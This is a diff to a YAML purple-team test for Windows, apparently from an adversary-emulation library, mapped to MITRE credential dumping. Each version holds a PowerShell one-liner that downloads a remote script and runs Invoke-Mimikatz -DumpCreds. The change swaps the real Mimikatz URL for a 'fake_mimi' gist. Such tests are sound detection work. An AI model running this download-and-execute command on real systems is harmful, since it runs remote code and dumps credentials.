@@ -1,4 +1,4 @@
-enabled: FALSE untested
+enabled: FALSE "This script contains malicious content and has been blocked by your antivirus software. :-/"
 meta:
   author: redcanary
   created: 2017-11-05
@@ -10,7 +10,7 @@ meta:
   mitre_attack_phase: Credential Access
   mitre_attack_technique: Credential Dumping
   purple_actions:
-    1: cmd.exe /c powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds\"
+    1: cmd.exe /c powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/carnal0wnage/73be3c832de957946b94040e216b289c/raw/c012c6feb06c8b22f2c479eba06fa87f81996a60/fake_mimi.txt'); Invoke-Mimikatz -DumpCreds\"
 os: windows
 name: Windows dump cres with powershell mimikatz.
 uuid: c7ad9fd9-e33b-4daf-bc56-eeed43dbec0c
